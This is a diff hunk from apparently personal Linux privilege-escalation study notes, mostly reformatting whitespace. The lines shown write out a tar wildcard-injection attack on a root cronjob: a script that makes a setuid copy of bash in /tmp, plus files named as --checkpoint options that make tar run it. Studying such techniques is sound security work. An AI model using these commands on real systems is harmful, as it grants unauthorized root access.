@@ -307,18 +307,16 @@ create function do_system returns integer soname 'raptor_udf2.so';
       - the command inside the cronjob can be abused by its commandline arugments for RCE
     - Related instructions : 
       - the command `tar` has a feature that allows users run commands as part of a checkpoint, for more info please see: [gtfoBins](https://gtfobins.github.io/)
-      - to abuse `tar`'s checkpoint RCE feature, and to abuse the cronjob using a wildcard `*` as one of its arguments, create a file with the same name as the the commandline option for `tar` that will allow RCE
-      
+      - to abuse `tar`'s checkpoint RCE feature, and to abuse the cronjob using a wildcard `*` as one of its arguments, create a file with the same name as the the commandline option for `tar` that will allow RCE    
       ```
       echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > run
       
       touch /home/user/--checkpoint=1
       touch /home/user/--checkpoint-action=exec=run
-      
       ```
          
-          - `tar` arguments: `--checkpoint=1` : defines that there is a checkpoint before reading/archiving the first record: `1`
-          - `tar` arguments: `--checkpoint-action=exec=run` : defines the action to do at each checkpoint, which is executing run (that lives in the same directory)
+         - `tar` arguments: `--checkpoint=1` : defines that there is a checkpoint before reading/archiving the first record: `1`
+         - `tar` arguments: `--checkpoint-action=exec=run` : defines the action to do at each checkpoint, which is executing run (that lives in the same directory)
 
 ### SUID/GUID
 
